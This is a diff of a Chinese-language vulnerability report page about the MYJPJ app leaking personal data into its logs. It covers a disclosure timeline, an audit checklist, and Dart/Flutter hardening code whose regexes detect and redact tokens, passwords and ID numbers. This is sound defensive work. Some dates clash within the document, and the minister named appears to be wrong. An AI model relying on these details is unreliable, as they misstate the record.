-          '2025-04-02：由于未收到 JPJ 官方回复，向交通部长魏家祥办公室提交跟进报告',
-          '2025-04-10：CNVD 完成漏洞审核，确认漏洞等级为严重（Critical）',
-          '2025-04-15：马来西亚媒体开始报道该安全漏洞'
+        icon: 'fa-paper-plane',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'paragraph',
+            text: '漏洞已按照负责任披露（Responsible Disclosure）原则提交至国家信息安全漏洞共享平台（CNVD），并同步通知马来西亚相关部门。以下为完整的披露时间线：'
+          },
+          {
+            type: 'table',
+            headers: ['日期', '事件'],
+            rows: [
+              ['2025-03-20', '在安全测试中发现日志泄露敏感信息漏洞，完成初步验证'],
+              ['2025-03-21', '进行深入分析，确认所有泄露字段，撰写详细漏洞报告'],
+              ['2025-03-22', '通过 CNVD 在线提交系统提交漏洞报告，附件包含完整日志样本和分析报告'],
+              ['2025-03-23', 'CNVD 初审通过，分配漏洞编号 CNVD-C-2025-176294'],
+              ['2025-03-24', '通过官方邮件 aduan@jpj.gov.my 向马来西亚陆路交通局提交漏洞报告（英文+马来文）'],
+              ['2025-03-25', '向马来西亚个人数据保护部（PDP Department）提交 PDPA 违规投诉'],
+              ['2025-04-02', '由于未收到 JPJ 官方回复，向交通部长魏家祥办公室提交跟进报告'],
+              ['2025-04-10', 'CNVD 完成漏洞审核，确认漏洞等级为严重（Critical）'],
+              ['2025-04-15', '马来西亚媒体开始报道该安全漏洞']
+            ]
+          },
+          {
+            type: 'image',
+            src: 'assets/CNVD-C-2025-176294.png',
+            alt: 'CNVD 漏洞提交截图',
+            caption: 'CNVD 漏洞复现证明 — 环境配置文件直接暴露在公网的复现截图'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250324-24f24c-email.png',
+            alt: '漏洞报告提交邮件截图',
+            caption: '官方邮件提交记录 — 2025年3月24日发送至 aduan@jpj.gov.my'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250324-24f24c-email-2.png',
+            alt: '向部长办公室提交漏洞报告邮件截图',
+            caption: '魏部长办公室邮件提交截图 — 2025年3月25日跟进报告'
+          }
         ]
       },
       {
-        heading: '六、媒体报道与官方回应',
-        body: '该漏洞被披露后，引发了马来西亚媒体和公众的广泛关注。多家主流媒体对事件进行了报道，政府部门也陆续做出回应。',
-        listItems: [
-          '媒体报道：Malay Mail、The Star、Free Malaysia Today、Sinar Harian 等主流媒体均报道了 MYJPJ 应用数据泄露事件，标题涉及\"JPJ app exposes personal data\"、\"MYJPJ data breach concerns\"等',
-          '公众反应：马来西亚网民在社交媒体上表达了对政府应用安全性的担忧，质疑政府机构的数据保护能力，部分用户表示将卸载应用',
-          'JPJ 初始回应：JPJ 发言人在接受采访时表示已关注到相关报告，技术团队正在调查核实，建议用户更新至最新版本',
-          '后续进展：交通部部长办公室确认已要求 JPJ 成立专项小组进行调查，并承诺将采取一切必要措施保护用户数据安全',
-          'PDPA 调查：马来西亚个人数据保护署（PDPC）确认已就潜在 PDPA 违规行为展开调查，若确认违规最高可罚款 50 万马币'
+        heading: '六、安全审计清单',
+        icon: 'fa-clipboard-check',
+        accent: '#16a085',
+        contents: [
+          {
+            type: 'paragraph',
+            text: '为系统性评估 MYJPJ 移动应用的安全状况，以下审计清单从日志安全、数据安全和网络安全三个维度列出关键检查项，供开发团队与安全审计人员参考。'
+          },
+          {
+            type: 'subheading',
+            text: '6.1 日志安全检查项（优先级：高）'
+          },
+          {
+            type: 'list',
+            items: [
+              '移除所有包含个人信息的日志打印',
+              '实现安全的日志记录机制（自动脱敏敏感字段）',
+              '定期清理日志文件，避免长期堆积',
+              '对日志访问进行权限控制',
+              '加密存储敏感日志信息'
+            ]
+          },
+          {
+            type: 'subheading',
+            text: '6.2 数据安全检查项（优先级：关键）'
+          },
+          {
+            type: 'list',
+            items: [
+              '使用安全的加密算法保护敏感数据',
+              '实现安全的密钥管理机制',
+              '定期更新加密密钥',
+              '安全删除临时文件和缓存'
+            ]
+          },
+          {
+            type: 'subheading',
+            text: '6.3 网络安全检查项（优先级：高）'
+          },
+          {
+            type: 'list',
+            items: [
+              '启用 SSL 证书固定（SSL Pinning）',
+              '实现请求签名机制',
+              '防止中间人攻击',
+              '限制 API 访问频率',
+              '监控异常网络活动',
+              '实时安全告警'
+            ]
+          }
         ]
       },
       {
         heading: '七、安全加固方案（Dart / Flutter 代码示例）',
-        body: '针对日志泄露问题，建议从日志安全、本地存储、网络通信和发布配置四个方面进行全面加固。以下为 Flutter/Dart 安全加固的代码示例：',
-        codeBlock: 'import \'package:flutter/foundation.dart\';\nimport \'package:flutter_secure_storage/flutter_secure_storage.dart\';\n\n/// 安全日志工具类 - 自动脱敏敏感字段\nclass SecureLogger {\n  static final List<RegExp> _sensitivePatterns = [\n    RegExp(r\'\\bnokp\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\bnoic\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\btoken\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\bpassword\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n    RegExp(r\'\\bbearer\\s+\\S+\', caseSensitive: false),\n    RegExp(r\'\\baddress?\\b[=:]\\s*[^&\\s,}"]+\', caseSensitive: false),\n  ];\n\n  static void log(dynamic message) {\n    if (kReleaseMode) return; // 发布模式完全禁用调试日志\n    final sanitized = _sanitize(message.toString());\n    debugPrint(sanitized);\n  }\n\n  static String _sanitize(String input) {\n    String result = input;\n    for (final pattern in _sensitivePatterns) {\n      result = result.replaceAllMapped(pattern, (m) {\n        final match = m.group(0)!;\n        final key = match.substring(0, match.indexOf(\':\') > 0 ? match.indexOf(\':\') : match.indexOf(\'=\'));\n        return \'$key:[REDACTED]\';\n      });\n    }\n    return result;\n  }\n}\n\n/// 安全存储工具类 - 使用 Keychain/Keystore\nclass SecureStorage {\n  static const _storage = FlutterSecureStorage();\n\n  static Future<void> saveToken(String token) async {\n    await _storage.write(key: \'auth_token\', value: token);\n  }\n\n  static Future<String?> getToken() async {\n    return await _storage.read(key: \'auth_token\');\n  }\n\n  static Future<void> deleteAll() async {\n    await _storage.deleteAll();\n  }\n}\n\n/// 网络请求安全配置 - SSL Pinning + 安全头\nclass SecureApiClient {\n  // 生产环境禁用所有日志\n  static final bool _enableLogs = kDebugMode;\n\n  static Future<Map<String, dynamic>> get(String url) async {\n    // 真实实现应使用 Dio + Certificate Pinning\n    if (_enableLogs) {\n      SecureLogger.log(\'GET request to: $url\'); // URL 不包含敏感信息\n    }\n    return {};\n  }\n}\n\n// 在 main.dart 中配置发布环境\nvoid main() {\n  if (kReleaseMode) {\n    // 发布模式：完全禁用调试输出\n    debugPrint = (String? message, {int? wrapWidth}) {};\n  }\n  runApp(const MyApp());\n}',
-        codeLang: 'dart'
+        icon: 'fa-shield-halved',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'paragraph',
+            text: '针对日志泄露问题，建议从日志安全、本地存储、网络通信和发布配置四个方面进行全面加固。以下为 Flutter/Dart 安全加固的代码示例：'
+          },
+          {
+            type: 'subheading',
+            text: '7.1 安全日志工具类（SecureLogger）'
+          },
+          {
+            type: 'code',
+            language: 'dart',
+            code: `import 'package:flutter/foundation.dart';
+
+/// 安全日志工具类 - 自动脱敏敏感字段
+class SecureLogger {
+  static final List<RegExp> _sensitivePatterns = [
+    RegExp(r'\\bnokp\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
+    RegExp(r'\\bnoic\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
+    RegExp(r'\\btoken\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
+    RegExp(r'\\bpassword\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
+    RegExp(r'\\bbearer\\s+\\S+', caseSensitive: false),
+    RegExp(r'\\baddress?\\b[=:]\\s*[^&\\s,}"]+', caseSensitive: false),
+  ];
+
+  static void log(dynamic message) {
+    if (kReleaseMode) return; // 发布模式完全禁用调试日志
+    final sanitized = _sanitize(message.toString());
+    debugPrint(sanitized);
+  }
+
+  static String _sanitize(String input) {
+    String result = input;
+    for (final pattern in _sensitivePatterns) {
+      result = result.replaceAllMapped(pattern, (m) {
+        final match = m.group(0)!;
+        final key = match.substring(0, match.indexOf(':') > 0 ? match.indexOf(':') : match.indexOf('='));
+        return '$key:[REDACTED]';
+      });
+    }
+    return result;
+  }
+}`
+          },
+          {
+            type: 'subheading',
+            text: '7.2 安全存储工具类（SecureStorage）'
+          },
+          {
+            type: 'code',
+            language: 'dart',
+            code: `import 'package:flutter_secure_storage/flutter_secure_storage.dart';
+
+/// 安全存储工具类 - 使用 Keychain/Keystore
+class SecureStorage {
+  static const _storage = FlutterSecureStorage();
+
+  static Future<void> saveToken(String token) async {
+    await _storage.write(key: 'auth_token', value: token);
+  }
+
+  static Future<String?> getToken() async {
+    return await _storage.read(key: 'auth_token');
+  }
+
+  static Future<void> deleteAll() async {
+    await _storage.deleteAll();
+  }
+}`
+          },
+          {
+            type: 'subheading',
+            text: '7.3 网络请求安全配置（SecureApiClient）'
+          },
+          {
+            type: 'code',
+            language: 'dart',
+            code: `/// 网络请求安全配置 - SSL Pinning + 安全头
+class SecureApiClient {
+  // 生产环境禁用所有日志
+  static final bool _enableLogs = kDebugMode;
+
+  static Future<Map<String, dynamic>> get(String url) async {
+    // 真实实现应使用 Dio + Certificate Pinning
+    if (_enableLogs) {
+      SecureLogger.log('GET request to: $url'); // URL 不包含敏感信息
+    }
+    return {};
+  }
+}
+
+// 在 main.dart 中配置发布环境
+void main() {
+  if (kReleaseMode) {
+    // 发布模式：完全禁用调试输出
+    debugPrint = (String? message, {int? wrapWidth}) {};
+  }
+  runApp(const MyApp());
+}`
+          },
+          {
+            type: 'subheading',
+            text: '7.4 SSL Pinning 配置（network-security-config.xml）'
+          },
+          {
+            type: 'code',
+            language: 'xml',
+            code: `<?xml version="1.0" encoding="utf-8"?>
+<network-security-config>
+  <domain-config>
+    <domain includeSubdomains="true">api.myjpj.gov.my</domain>
+    <pin-set>
+      <pin digest="SHA-256">BASE64_HASH</pin>
+    </pin-set>
+  </domain-config>
+</network-security-config>`
+          },
+          {
+            type: 'success-box',
+            icon: 'fa-check-circle',
+            text: '通过以上四层加固，可有效防止敏感数据通过日志泄露、本地存储被窃取、网络通信被劫持，以及发布版本中调试代码残留等问题。建议在 CI/CD 流水线中加入自动化安全扫描，确保加固措施持续有效。'
+          }
+        ]
       },
       {
-        heading: '八、结论与建议总结',
-        body: 'MYJPJ 移动应用的敏感数据日志泄露漏洞是一个典型的"开发调试代码残留到生产环境"的安全问题。作为政府官方应用，承载着数百万马来西亚车主的敏感个人信息，此类低级错误本不应发生。该漏洞不仅违反了马来西亚 PDPA 2010 个人数据保护法，也损害了公众对政府数字化服务的信任。建议政府机构在推动数字化转型的同时，将安全作为核心考量，建立完善的安全开发流程和审计机制。',
-        listItems: [
-          '立即措施：发布紧急更新，移除所有敏感数据的日志输出；通知所有用户建议更新应用；重置可能泄露的 API 密钥',
-          '中期措施：开展全面安全审计，检查是否存在其他类似问题；实施代码审查制度，确保调试代码不会进入生产环境',
-          '长期措施：建立安全开发生命周期（SDL）流程；对开发团队进行安全培训；引入自动化安全扫描工具（静态代码分析、移动应用安全检测）',
-          '合规措施：按照 PDPA 要求进行数据保护影响评估（DPIA）；建立数据泄露应急响应机制；定期进行第三方安全审计'
+        heading: '八、结论',
+        icon: 'fa-flag-checkered',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'conclusion',
+            title: '漏洞定性结论',
+            text: 'MYJPJ 移动应用的敏感数据日志泄露漏洞是一个典型的"开发调试代码残留到生产环境"的安全问题。作为政府官方应用，承载着数百万马来西亚车主的敏感个人信息，此类低级错误本不应发生。该漏洞不仅违反了马来西亚 PDPA 2010 个人数据保护法，也损害了公众对政府数字化服务的信任。建议政府机构在推动数字化转型的同时，将安全作为核心考量，建立完善的安全开发流程和审计机制。'
+          },
+          {
+            type: 'subheading',
+            text: '8.1 修复与整改评估矩阵'
+          },
+          {
+            type: 'table',
+            headers: ['评估维度', '当前状态', '目标状态', '优先级'],
+            rows: [
+              ['日志安全', '敏感数据明文输出至 logcat', '自动脱敏 + 发布模式禁用', '紧急'],
+              ['数据存储', '敏感信息明文存储', 'Keychain/Keystore 加密存储', '高'],
+              ['网络通信', '未启用 SSL Pinning', '证书固定 + 请求签名', '高'],
+              ['发布配置', '调试代码残留', 'CI/CD 自动化扫描拦截', '中'],
+              ['合规性', '违反 PDPA 2010 多项原则', '完成 DPIA 评估 + 合规整改', '高'],
+              ['应急响应', '无数据泄露应急机制', '建立应急响应预案 + 定期演练', '中']
+            ]
+          },
+          {
+            type: 'subheading',
+            text: '8.2 整改建议时间线'
+          },
+          {
+            type: 'list',
+            items: [
+              '立即措施（24小时内）：发布紧急更新，移除所有敏感数据的日志输出；通知所有用户建议更新应用；重置可能泄露的 API 密钥',
+              '中期措施（1-2周内）：开展全面安全审计，检查是否存在其他类似问题；实施代码审查制度，确保调试代码不会进入生产环境',
+              '长期措施（1-3个月）：建立安全开发生命周期（SDL）流程；对开发团队进行安全培训；引入自动化安全扫描工具（静态代码分析、移动应用安全检测）',
+              '合规措施（持续）：按照 PDPA 要求进行数据保护影响评估（DPIA）；建立数据泄露应急响应机制；定期进行第三方安全审计'
+            ]
+          },
+          {
+            type: 'info-box',
+            icon: 'fa-shield-heart',
+            text: '本报告已于 2025-03-20 通过 CNVD 提交至 MYJPJ 官方（CNVD-C-2025-176294），并在 2025-04-15 完成 CNVD 归档。希望 JPJ 能够认真对待此次披露，推动马来西亚政府应用安全水平的整体提升。'
+          }
         ]
       }
     ]
